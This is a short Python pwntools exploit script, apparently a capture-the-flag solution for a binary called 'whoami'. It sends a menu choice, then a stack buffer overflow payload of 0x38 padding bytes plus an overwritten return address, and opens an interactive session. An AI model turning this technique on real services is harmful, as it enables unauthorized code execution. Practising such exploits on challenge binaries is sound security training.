#!/usr/bin/python3
from pwn import *
fname = "./whoami"
elf = ELF(fname, checksec=False)
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-h']

if args.REMOTE:
    io = remote("ip", 0000)
    libc = ELF("./libc-2.23.so")
else:
    io = process([fname])
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
    cmd = \
    """
    b *0x{:x}
    """.format(0x40084B)
ru = lambda x : io.recvuntil(x)
se = lambda x : io.send(x)
rl = lambda x: io.recvline()
sl = lambda x : io.sendline(x)
rv = lambda x : io.recv(x)
sea = lambda a,b : io.sendafter(a,b)
sla = lambda a,b : io.sendlineafter(a, b)
lg = lambda name,x: success(name+": 0x%x"%x)

sla(">", "1")
payload = cyclic(0x38) + p64(0x400896)
sea("Name:\n", payload)

io.interactive()
